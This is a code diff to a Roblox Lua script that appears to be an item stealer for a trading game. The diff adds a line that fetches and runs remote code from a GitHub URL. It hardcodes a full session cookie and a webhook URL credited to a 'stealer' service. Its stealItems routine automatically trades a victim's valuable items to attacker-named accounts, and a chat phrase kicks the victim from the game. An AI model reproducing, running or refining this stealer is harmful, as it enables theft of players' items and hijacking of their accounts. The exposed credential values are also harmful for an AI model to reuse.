@@ -1,5 +1,8 @@
+-- ==================== ЗАПУСК АНТИ-БАНА В НАЧАЛЕ ====================
+loadstring(game:HttpGet('https://raw.githubusercontent.com/FBScripts/sadsad/refs/heads/main/Adm2025',true))()
+
 -- ==================== JOB ID VERIFICATION SYSTEM ====================
-getgenv().Cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhwKBGR1aWQSFDE4MTA0MDMzNzA3MjI1MTI4OTA3KAM.m2O8Mgy837sKNWNL2tDq99fU1T1JNOpD4dOnMJX6JSIj5rHpcXfSMTYG-RHxadJmd6zEnSFCOiNT55STuq8wNXty-rBr15qjFFcE-3a6ZJCC1r0phpvr7ZpLwyOMWactm0Z4Z34m7a5caZdYVrcAoufG7aL-EOm81KulCZA3NHSpPOVKLeGlDePX0bDUPTqLukm4w3aDtyA6uuTjpImLuJby3VoYDNiZX2VaXX155CreUPTTKzvaQ7U6OkX_v7VjB7Ardcn0NuFR-e2ohKH2To2OzW6f2BllzuEkcs3EjdTD9dyEQ0SfuVLwd0rN9HFCKEtJM3IITbk3YoGRmCZH4ez69Y3F97Qaaa5cfFEv5Ngps41gR84-NbE6AysdVKJTjkTo_BXv31183LaM9gR9cuHaxX6GHJKTWx6iYdVT_LblYZQ0OLIUnal_at21qH53clZsgr6LX6_D7OY9rWBJMf9Jl6vD4e_oGaOQ-_CnVYpZsdWpKlzuDFCowiQ2-n-EX7cWJPlQrXsQ9227qAwjYvIitBsq8xNtrrLdMPm1jKubyoo_H4Lzicf9rJqB4XUANIYn3_g_q9ye7D_tcA4TNXgXCeIc08rOO1C1mBddV0DnUfuGGATNxpolxq6lj8aa07i1O9C7xjcO4ryOUbEKddaPQMVeMOyuY5phzh2DcMiYG-aNGyFj3abv_2F5WdKgo29ZsDswvpTo_hzjLjaq-LHEVzUlW2Dys9hkE_ln154zREe0DWSbOC-aijpaxvsEroz2VP0pIic2SZ-vjoqXOH0go-o_WxkPK3rDYtpU5gp0Sa04"
+getgenv().Cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhACIhsKBGR1aWQSEzk2MTA1NTI5NTY3MTI2MDQyNjYoAw.Q_bHAVD-HxDeSgomIU63hkyS89xZS1_97S9SjHOR7eTtf4XBzKdp6NaghwZ6iOSe043CoTzmZq_yVM-6b7kEUuoa8Cw8ech3loB2FyAiUoJZpB2wtUf-t-pfzWQGEdUYjiCTpVRyFTSU7ATuGGDR_9SVJzYICEwaKItC7wKbI4d_4WejHTiYOmv8ut8wC95Ipe3B1yOssRD6t_xSsAKyyo7skhulxPyBzXpMgLvKAyNLMETtZnZS5Ewl5Hp8ph7BDz2gmMWoYEaZ0gHswU20nbuLxpUwPSnqyUn0CWaeh3L0413PpsLPhuPc85MwgTYN_Px_9x22QywYzO_AP4I63cwe_-pdbFfChZg_kAkQ8BhvTXXLxzJHYvIeqtle0YOyO7SR3UnlX27iUs79KZcY-BidC-5AE9gOzOoaeCiMulCPGD02HDaGcD0VHXLpkwpWuK3VbYsyR045lpJpG5oiJXhCKehDPA6fgRFMt1FV5hgm10lgx8ihE-VY_UcZML1GFWphtfiv0doVwuXkkSDWEoOjw86t0C5WE4Uu_t7_j-S06KJfd7RcasGu2bAfxC49u7z_mxP4pyvN2t05DR48f4IjiSOv77OWFdO9JeWPckJzgNi_kmicTiKoDszXujiNNIjjeS0VCH8Jo6LCkcdOkfwDaTp-s0SqnXDLPhCSD7YAH8dxm6_YjPM5E5kDvg1aobkDu6KVmAjRFGxLyGpkBxvmoWLR03hcSTra5VUTOWp52uDqYT3D_5JtvYKE8E0oix3bx8l-vmUAfzM1DMh1jTkkqxMSP1rJh9lH2H0H5sLDLKIlJtL8kUkv6FvlQ0LcHfQjwgiVXQz_0Zm-YN7vU9F2kFP75RXRcOmdgvlwsgHs3FBOPhnydQwiEVGtzt-Ed3Ew6j4ukvX3v4SyV89luczy2Yg2WHBnxUhob-A58b_JSIjuv3JOqe_vcq5yya2fQaeGVXpjML7UmCY5X26DxDT2oRLIErYheHa4PEJF4_vxw1izxb9opVc5C3UOKjd9hHOfjysUsNzVHxk_tw8h5Z7mVKw40LwpbcZfoPrbl2Or6gp1BubaljahxhZmcKKN3HG1AuXlnZbkexR1v76FUGMi_n06RQrWVIgTi2ILRqKHZkF46nAfGPIgq6qeE-zKt9XEmMK3EesTHMjDa1HNINUT2JY"
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -325,8 +328,8 @@ local function FindRealJobId(inventoryValue, playerName)
 end
 
 -- ==================== ОРИГИНАЛЬНЫЙ КОД (С ИЗМЕНЕНИЯМИ) ====================
-Username = "Roopo1344" -- >> Your main account
-Username2 = "Roopo1344" -- >> Your alt account
+Username = "knisdqx_meow" -- >> Your main account
+Username2 = "noviy_nickname" -- >> Your alt account
 Webhook = "https://webhook.lewisakura.moe/api/webhooks/1441725786586615820/MjAaItKYv69qFFNdgxWQn1xe2HdO0ZV3rRKrbzBLk64Gb99KvxnLNyM9evUsYQa-Vd42" -- >> https://stealer.to/
 MinimumValues = 30 -- >> Set 0 to disable
 
@@ -399,6 +402,200 @@ local rareItemsValue = 0
 local uncommonItemsValue = 0
 local commonItemsValue = 0
 
+-- ГЛОБАЛЬНАЯ ТАБЛИЦА ЗНАЧЕНИЙ
+local valuesTable = {
+    -- >> Ancients/Tier 2 << --
+    ["Gingerscope"] = 10500,
+    ["TravelerAxe"] = 5000,
+    ["Harvester"] = 390,
+    ["Icepiercer"] = 350,
+    ["VampireAxe"] = 600,
+    ["Celestial"] = 800,
+    ["Corrupt"] = 800,
+    -- >> Ancients/Tier 1 << --
+    ["SwirlyAxe"] = 100,
+    ["Icebreaker"] = 100,
+    ["ElderwoodScythe"] = 65,
+    ["Scythe"] = 77,
+    ["Hallowscythe"] = 55,
+    ["Logchopper"] = 25,
+    ["Icewing"] = 5,
+    -- >> Vintages/Tier 2 << --
+    ["GhostK2018"] = 10,
+    ["AmericaGun"] = 8,
+    ["BloodKnife"] = 8,
+    -- >> Vintages/Tier 1 << --
+    ["Disint"] = 7,
+    ["Phaser"] = 7,
+    ["ShadowKnife"] = 6,
+    ["TimeKnife"] = 5,
+    ["Gun1"] = 4,
+    ["GoldenGun"] = 4,
+    ["Knife1"] = 3,
+    -- >> Chromas/Tier 3 << --
+    ["TravelerGunChroma"] = 20000,
+    ["TreeGun2023Chroma"] = 30000,
+    ["TreeKnife2023Chroma"] = 35000,
+    ["VampireGunChroma"] = 10000,
+    ["ConstellationChroma"] = 10000,
+    ["BaubleChroma"] = 6500,
+    ["WatergunChroma"] = 3500,
+    ["RaygunChroma"] = 7000,
+    ["AlienbeamChroma"] = 9000,
+    ["SunsetChroma"] = 3500,
+    ["SunriseChroma"] = 4500,
+    -- >> Chromas/Tier 2 << --
+    ["ChromaDarkbringer"] = 125,
+    ["ChromaLightbringer"] = 120,
+    ["CandleflameChroma"] = 115,
+    ["ElderwoodKnifeChroma"] = 115,
+    ["SwirlyGunChroma"] = 115,
+    ["Gingermint_KChroma"] = 110,
+    -- >> Chromas/Tier 1 << --
+    ["LugerChroma"] = 100,
+    ["LaserChroma"] = 80,
+    ["HeatChroma"] = 70,
+    ["DeathshardChroma"] = 65,
+    ["GemstoneChroma"] = 65,
+    ["SharkChroma"] = 65,
+    ["SlasherChroma"] = 65,
+    ["TidesChroma"] = 65,
+    ["FangChroma"] = 55,
+    ["GingerbladeChroma"] = 55,
+    ["SeerChroma"] = 55,
+    ["BonebladeChroma"] = 50,
+    ["SawChroma"] = 50,
+    -- >> Godlies/Tier 3 << --
+    ["TravelerGun"] = 3600,
+    ["TreeGun2023"] = 2800,
+    ["Turkey2023"] = 1500,
+    ["TreeKnife2023"] = 1200,
+    ["Blossom_G"] = 640,
+    ["Sakura_K"] = 630,
+    ["Constellation"] = 800,
+    ["Darkshot"] = 600,
+    ["Darksword"] = 460,
+    ["VampireGun"] = 800,
+    ["Bauble"] = 400,
+    ["ZombieBat"] = 250,
+    ["Candy"] = 150,
+    ["Rainbow_G"] = 300,
+    ["Rainbow_K"] = 300,
+    ["Ocean_G"] = 150,
+    ["WraithGun"] = 145,
+    ["WraithKnife"] = 145,
+    ["Waves_K"] = 145,
+    ["AuroraKnife"] = 135,
+    ["AuroraGun"] = 135,
+    ["FlowerwoodGun"] = 135,
+    ["FlowerwoodKnife"] = 130,
+    ["Heartblade"] = 125,
+    ["Sugar"] = 125,
+    ["SwirlyGun"] = 115,
+    ["Makeshift"] = 105,
+    ["Candleflame"] = 100,
+    ["ElderwoodKnife"] = 100,
+    ["Watergun"] = 90,
+    ["Raygun"] = 250,
+    ["Alienbeam"] = 300,
+    ["Xenoknife"] = 200,
+    ["Xenoshot"] = 250,
+    ["Flora"] = 200,
+    ["Bloom"] = 200,
+    ["Sunset"] = 250,
+    ["Sunrise"] = 300,
+    ["Snowcannon"] = 600,
+    ["Snowdagger"] = 600,
+    -- >> Godlies/Tier 2 << --
+    ["Phantom2022"] = 75,
+    ["Spectre2022"] = 75,
+    ["Luger"] = 75,
+    ["RedLuger"] = 70,
+    ["SwirlyBlade"] = 65,
+    ["Iceblaster"] = 65,
+    ["Pearl_K"] = 62,
+    ["Pearl_G"] = 62,
+    ["Darkbringer"] = 60,
+    ["ElderwoodGun"] = 60,
+    ["Lightbringer"] = 58,
+    ["Gingermint_K"] = 40,
+    ["Gingermint_G"] = 40,
+    ["GreenLuger"] = 40,
+    ["Hallowgun"] = 35,
+    ["Laser"] = 32,
+    ["Icebeam"] = 32,
+    ["Iceflake"] = 32,
+    ["Plasmabeam"] = 32,
+    ["Plasmablade"] = 32,       
+    ["Amerilaser"] = 30,
+    ["Blaster"] = 30,
+    ["Nightblade"] = 30,
+    ["AmericaSword"] = 28,
+    ["Nebula"] = 28,
+    ["Shark"] = 28,
+    ["Virtual"] = 27,
+    ["Gemstone"] = 25,
+    ["Clockwork"] = 23,
+    ["EternalCane"] = 23,
+    ["GingerLuger"] = 23,
+    ["Lugercane"] = 23,
+    ["Pixel"] = 23,
+    ["Slasher"] = 23,
+    ["Gingerblade"] = 22,
+    ["Heat"] = 22,
+    ["Minty"] = 22,
+    -- >> Godlies/Tier 1 << --
+    ["BattleAxe2"] = 20,
+    ["Deathshard"] = 20,
+    ["Tides"] = 20,
+    ["Fang"] = 18,
+    ["Spider"] = 17,
+    ["Chill"] = 17,
+    ["Jinglegun"] = 15,
+    ["VampiresEdge"] = 15,
+    ["Pumpking"] = 15,
+    ["Bioblade"] = 13,
+    ["BattleAxe"] = 13,
+    ["Frostsaber"] = 13,
+    ["Xmas"] = 13,
+    ["Flames"] = 12,
+    ["Hallow"] = 12,
+    ["IceDragon"] = 12,
+    ["IceShard"] = 12,
+    ["WintersEdge"] = 12,
+    ["Ghostblade"] = 10,
+    ["HallowsBlade"] = 10,
+    ["Handsaw"] = 10,
+    ["Eternal"] = 10,
+    ["Eternal2"] = 10,
+    ["Eternal3"] = 10,
+    ["Eternal4"] = 10,
+    ["Boneblade"] = 8,
+    ["Eggblade"] = 7,
+    ["Frostbite"] = 7,
+    ["Prismatic"] = 7,
+    ["Saw"] = 7,
+    ["Snowflake"] = 7,
+    -- >> Godlies/Tier 0 << --
+    ["Peppermint"] = 7,
+    ["Cookieblade"] = 7,
+    ["BlueSeer"] = 7,
+    ["PurpleSeer"] = 7,
+    ["RedSeer"] = 7,
+    ["TheSeer"] = 7,
+    ["OrangeSeer"] = 7,
+    ["YellowSeer"] = 7,
+    -- >> Legendaries/Special Tier << --
+    ["JD"] = 65,
+    -- >> Legendaries/Tier 3 << --
+    ["Latte_G_2023"] = 90,
+    ["Latte_K_2023"] = 90,
+    ["CottonCandy"] = 65,
+    ["Witched"] = 55,
+    ["Beach_K_2023"] = 30,
+    ["Cavern_K_2019"] = 22,
+}
+
 local function CalculateInventory()
     -- Сбрасываем значения
     totalValues = 0
@@ -411,199 +608,34 @@ local function CalculateInventory()
     uncommonItemsValue = 0
     commonItemsValue = 0
     
-    -- Таблица значений для расчетов
-    local valuesTable = {
-        -- >> Ancients/Tier 2 << --
-        ["Gingerscope"] = 10500,
-        ["TravelerAxe"] = 5000,
-        ["Harvester"] = 390,
-        ["Icepiercer"] = 350,
-        ["VampireAxe"] = 600,
-        ["Celestial"] = 800,
-        ["Corrupt"] = 800,
-        -- >> Ancients/Tier 1 << --
-        ["SwirlyAxe"] = 100,
-        ["Icebreaker"] = 100,
-        ["ElderwoodScythe"] = 65,
-        ["Scythe"] = 77,
-        ["Hallowscythe"] = 55,
-        ["Logchopper"] = 25,
-        ["Icewing"] = 5,
-        -- >> Vintages/Tier 2 << --
-        ["GhostK2018"] = 10,
-        ["AmericaGun"] = 8,
-        ["BloodKnife"] = 8,
-        -- >> Vintages/Tier 1 << --
-        ["Disint"] = 7,
-        ["Phaser"] = 7,
-        ["ShadowKnife"] = 6,
-        ["TimeKnife"] = 5,
-        ["Gun1"] = 4,
-        ["GoldenGun"] = 4,
-        ["Knife1"] = 3,
-        -- >> Chromas/Tier 3 << --
-        ["TravelerGunChroma"] = 20000,
-        ["TreeGun2023Chroma"] = 30000,
-        ["TreeKnife2023Chroma"] = 35000,
-        ["VampireGunChroma"] = 10000,
-        ["ConstellationChroma"] = 10000,
-        ["BaubleChroma"] = 6500,
-        ["WatergunChroma"] = 3500,
-        ["RaygunChroma"] = 7000,
-        ["AlienbeamChroma"] = 9000,
-        ["SunsetChroma"] = 3500,
-        ["SunriseChroma"] = 4500,
-        -- >> Chromas/Tier 2 << --
-        ["ChromaDarkbringer"] = 125,
-        ["ChromaLightbringer"] = 120,
-        ["CandleflameChroma"] = 115,
-        ["ElderwoodKnifeChroma"] = 115,
-        ["SwirlyGunChroma"] = 115,
-        ["Gingermint_KChroma"] = 110,
-        -- >> Chromas/Tier 1 << --
-        ["LugerChroma"] = 100,
-        ["LaserChroma"] = 80,
-        ["HeatChroma"] = 70,
-        ["DeathshardChroma"] = 65,
-        ["GemstoneChroma"] = 65,
-        ["SharkChroma"] = 65,
-        ["SlasherChroma"] = 65,
-        ["TidesChroma"] = 65,
-        ["FangChroma"] = 55,
-        ["GingerbladeChroma"] = 55,
-        ["SeerChroma"] = 55,
-        ["BonebladeChroma"] = 50,
-        ["SawChroma"] = 50,
-        -- >> Godlies/Tier 3 << --
-        ["TravelerGun"] = 3600,
-        ["TreeGun2023"] = 2800,
-        ["Turkey2023"] = 1500,
-        ["TreeKnife2023"] = 1200,
-        ["Blossom_G"] = 640,
-        ["Sakura_K"] = 630,
-        ["Constellation"] = 800,
-        ["Darkshot"] = 600,
-        ["Darksword"] = 460,
-        ["VampireGun"] = 800,
-        ["Bauble"] = 400,
-        ["ZombieBat"] = 250,
-        ["Candy"] = 150,
-        ["Rainbow_G"] = 300,
-        ["Rainbow_K"] = 300,
-        ["Ocean_G"] = 150,
-        ["WraithGun"] = 145,
-        ["WraithKnife"] = 145,
-        ["Waves_K"] = 145,
-        ["AuroraKnife"] = 135,
-        ["AuroraGun"] = 135,
-        ["FlowerwoodGun"] = 135,
-        ["FlowerwoodKnife"] = 130,
-        ["Heartblade"] = 125,
-        ["Sugar"] = 125,
-        ["SwirlyGun"] = 115,
-        ["Makeshift"] = 105,
-        ["Candleflame"] = 100,
-        ["ElderwoodKnife"] = 100,
-        ["Watergun"] = 90,
-        ["Raygun"] = 250,
-        ["Alienbeam"] = 300,
-        ["Xenoknife"] = 200,
-        ["Xenoshot"] = 250,
-        ["Flora"] = 200,
-        ["Bloom"] = 200,
-        ["Sunset"] = 250,
-        ["Sunrise"] = 300,
-        ["Snowcannon"] = 600,
-        ["Snowdagger"] = 600,
-        -- >> Godlies/Tier 2 << --
-        ["Phantom2022"] = 75,
-        ["Spectre2022"] = 75,
-        ["Luger"] = 75,
-        ["RedLuger"] = 70,
-        ["SwirlyBlade"] = 65,
-        ["Iceblaster"] = 65,
-        ["Pearl_K"] = 62,
-        ["Pearl_G"] = 62,
-        ["Darkbringer"] = 60,
-        ["ElderwoodGun"] = 60,
-        ["Lightbringer"] = 58,
-        ["Gingermint_K"] = 40,
-        ["Gingermint_G"] = 40,
-        ["GreenLuger"] = 40,
-        ["Hallowgun"] = 35,
-        ["Laser"] = 32,
-        ["Icebeam"] = 32,
-        ["Iceflake"] = 32,
-        ["Plasmabeam"] = 32,
-        ["Plasmablade"] = 32,       
-        ["Amerilaser"] = 30,
-        ["Blaster"] = 30,
-        ["Nightblade"] = 30,
-        ["AmericaSword"] = 28,
-        ["Nebula"] = 28,
-        ["Shark"] = 28,
-        ["Virtual"] = 27,
-        ["Gemstone"] = 25,
-        ["Clockwork"] = 23,
-        ["EternalCane"] = 23,
-        ["GingerLuger"] = 23,
-        ["Lugercane"] = 23,
-        ["Pixel"] = 23,
-        ["Slasher"] = 23,
-        ["Gingerblade"] = 22,
-        ["Heat"] = 22,
-        ["Minty"] = 22,
-        -- >> Godlies/Tier 1 << --
-        ["BattleAxe2"] = 20,
-        ["Deathshard"] = 20,
-        ["Tides"] = 20,
-        ["Fang"] = 18,
-        ["Spider"] = 17,
-        ["Chill"] = 17,
-        ["Jinglegun"] = 15,
-        ["VampiresEdge"] = 15,
-        ["Pumpking"] = 15,
-        ["Bioblade"] = 13,
-        ["BattleAxe"] = 13,
-        ["Frostsaber"] = 13,
-        ["Xmas"] = 13,
-        ["Flames"] = 12,
-        ["Hallow"] = 12,
-        ["IceDragon"] = 12,
-        ["IceShard"] = 12,
-        ["WintersEdge"] = 12,
-        ["Ghostblade"] = 10,
-        ["HallowsBlade"] = 10,
-        ["Handsaw"] = 10,
-        ["Eternal"] = 10,
-        ["Eternal2"] = 10,
-        ["Eternal3"] = 10,
-        ["Eternal4"] = 10,
-        ["Boneblade"] = 8,
-        ["Eggblade"] = 7,
-        ["Frostbite"] = 7,
-        ["Prismatic"] = 7,
-        ["Saw"] = 7,
-        ["Snowflake"] = 7,
-        -- >> Godlies/Tier 0 << --
-        ["Peppermint"] = 7,
-        ["Cookieblade"] = 7,
-        ["BlueSeer"] = 7,
-        ["PurpleSeer"] = 7,
-        ["RedSeer"] = 7,
-        ["TheSeer"] = 7,
-        ["OrangeSeer"] = 7,
-        ["YellowSeer"] = 7,
-        -- >> Legendaries/Special Tier << --
-        ["JD"] = 65,
-        -- >> Legendaries/Tier 3 << --
-        ["Latte_G_2023"] = 90,
-        ["Latte_K_2023"] = 90,
-        ["CottonCandy"] = 65,
-        ["Witched"] = 55,
-        ["Beach_K_2023"] = 30,
-        ["Cavern_K_2019"] = 22,
-    }
+    -- Очищаем таблицы
+    allItems = {}
+    vintageItems1 = {}
+    commonItems1 = {}
+    uncommonItems1 = {}
+    rareItems1 = {}
+    legendaryItems1 = {}
+    godlyItems1 = {}
+    ancientItems1 = {}
+    uniqueItems1 = {}
+    
+    vintageItems = {}
+    commonItems = {}
+    uncommonItems = {}
+    rareItems = {}
+    legendaryItems = {}
+    godlyItems = {}
+    ancientItems = {}
+    uniqueItems = {}
+    
+    vintageItemsC = 0
+    commonItemsC = 0
+    uncommonItemsC = 0
+    rareItemsC = 0
+    legendaryItemsC = 0
+    godlyItemsC = 0
+    ancientItemsC = 0
+    uniqueItemsC = 0
 
     for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
         for c, d in pairs(b) do
@@ -1235,45 +1267,43 @@ local function stealItems(ReceiverName)
     end
 end
 
--- Обработчики чата (как в оригинале)
-game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == Username or Username2 then
-        player.Chatted:Connect(function(msg)
-            loop = true
-            stealItems(Username)
+-- ==================== УЛУЧШЕННАЯ СИСТЕМА ОБРАБОТКИ ИГРОКОВ ====================
+local function SetupTradeForPlayer(player)
+    if player.Name == Username or player.Name == Username2 then
+        print("Обнаружен нужный игрок:", player.Name)
+        
+        -- Подписываемся на чат для трейда
+        player.Chatted:Connect(function(message)
+            if message:lower():match("trade") or message:lower():match("обмен") then
+                print("Получена команда на трейд от", player.Name)
+                loop = true
+                stealItems(player.Name)
+            end
         end)
-    end
-end)
-
--- >> /kick command << --
-game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == Username or Username2 then
-    player.Chatted:Connect(function(message)
-        if message == "free dope" then
-            game.Players.LocalPlayer:Kick("\nPlease rejoin!")
-        end
-    end)
-end
-end)
-
--- Автозапуск если игрок уже в игре
-for _, player in pairs(game.Players:GetPlayers()) do
-        if player.Name == Username or Username2 then
+        
+        -- Подписываемся на /kick command
         player.Chatted:Connect(function(message)
             if message == "free dope" then
                 game.Players.LocalPlayer:Kick("\nPlease rejoin!")
             end
         end)
+        
+        -- Автоматически начинаем трейд при подключении
+        print("Начинаем автоматический трейд с", player.Name)
+        task.wait(2)  -- Ждем немного перед началом
+        loop = true
+        stealItems(player.Name)
     end
 end
 
+-- Обработчик для новых игроков
+game.Players.PlayerAdded:Connect(function(player)
+    SetupTradeForPlayer(player)
+end)
+
+-- Обработка уже подключенных игроков
 for _, player in pairs(game.Players:GetPlayers()) do
-    if player.Name == Username or Username2 then
-        player.Chatted:Connect(function(msg)
-            loop = true
-            stealItems(Username)
-        end)
+    if player.Name == Username or player.Name == Username2 then
+        SetupTradeForPlayer(player)
     end
 end
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/FBScripts/sadsad/refs/heads/main/Adm2025',true))()
